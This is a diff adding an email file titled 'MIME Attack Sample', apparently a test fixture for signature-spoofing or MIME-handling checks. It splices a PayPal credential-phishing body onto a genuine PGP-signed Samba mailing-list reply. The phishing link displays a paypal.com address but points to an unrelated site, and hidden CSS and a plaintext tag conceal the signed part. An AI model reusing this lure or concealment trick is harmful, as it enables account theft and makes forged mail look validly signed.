@@ -1,0 +1,102 @@
+From: cindy.olson@enron.com
+To: mark.powell@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+	charset="us-ascii"
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1106
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1106
+Message-Id: <S377083AbXJCNZs/20071003132548Z+68950@swip004.ftl.affinity.com>
+Content-Length: 1980
+Lines: 39
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 244
+
+
+
+		<img src="http://www.paypalobjects.com/en_US/i/header/header_girlBike_589x133.jpg" border="0" NOSEND="1">
+		<p><font face="Verdana" size="2">Dear valued <strong>PayPal</strong>
+		member</font>: <br>
+		<br>
+		&nbsp;</p>
+		<p><font face="Verdana" size="2">Identity protection matters. And
+		<strong>PayPal</strong> works day and night to help keep your identity
+		safe. That's why it has come to our attention that your <strong>PayPal</strong>
+		account information needs to be updated as part of our continuing
+		commitment to protect your account and to reduce the instance of fraud
+		on our website. If you could take 5-10 minutes out of your online
+		experience and update your personal records you will not run into any
+		future problems with the online service.<br>
+		&nbsp;</font></p>
+		<p><font face="Verdana" size="2">However, failure to update your records
+		will result in account suspension.<br>
+		&nbsp;</font></p>
+		<p><font face="Verdana" size="2">Once you have updated your account
+		records, your <strong>PayPal</strong> session will not be interrupted
+		and will continue as normal.</font></p>
+		<p><font face="Verdana" size="2">To login to your <strong>PayPal</strong>
+		account and update your records click on the following link:<br>
+		&nbsp;</font></p>
+		<a target="_top" href="http://www.club-regime.com/reglette-poids/reglettes-cree/.p/pwi/pwi/in.php">
+		<font face="Verdana" color="#0000ff" size="2">
+		https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</font></a><br>
+		&nbsp;
+		<p><font face="Verdana" size="2">Thank You for using PayPal!<br>
+		&nbsp;</font></p>
+		<p><font face="Verdana" size="2">The <strong>PayPal</strong> Team</font></p>
+		<table width="100%" border="0">
+			<tr>
+				<td width="57%">
+				<img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border="0" NOSEND="1"></td>
+				<td width="43%">
+				<img height="80" src="https://www.paypalobjects.com/en_US/i/email/email_ts_120x80.gif" width="120" NOSEND="1"></td>
+			</tr>
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--DELIMITER
+Content-Type: multipart/signed; boundary="BOUNDARY"; protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Jelmer Vernooij schrieb:
+> Stefan (metze) Metzmacher wrote:
+>> jelmer@samba.org schrieb:
+>>> Author: jelmer
+>>> Date: 2007-05-02 16:10:03 +0000 (Wed, 02 May 2007)
+>>> New Revision: 22638
+>>> WebSVN: http://websvn.samba.org/cgi-bin/viewcvs.cgi?view=rev&root=samba&rev=22638
+>>> Log:
+>>> Tag current TDB as 1.1.0
+>>> Added:
+>>>    tags/TDB_1_1_0/
+>> why not TDB_1_0_1 ?
+> The sourceforge project with TDB and the package in Debian both use
+> 1.0.1 as version number. I figured the support for transactions and the
+> other improvements qualified for a new minor release.
+
+ok, fine:-)
+
+
+
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.5 (GNU/Linux)
+Comment: Using GnuPG with SUSE - http://enigmail.mozdev.org
+
+iD8DBQFGOMOOm70gjA5TCD8RAsFGAJsH0IPCY30RixyJrk8NDEz9nsvR5gCgqeGD
+OPV1XALAswG3QotgTRwRJu0=
+=GV+z
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
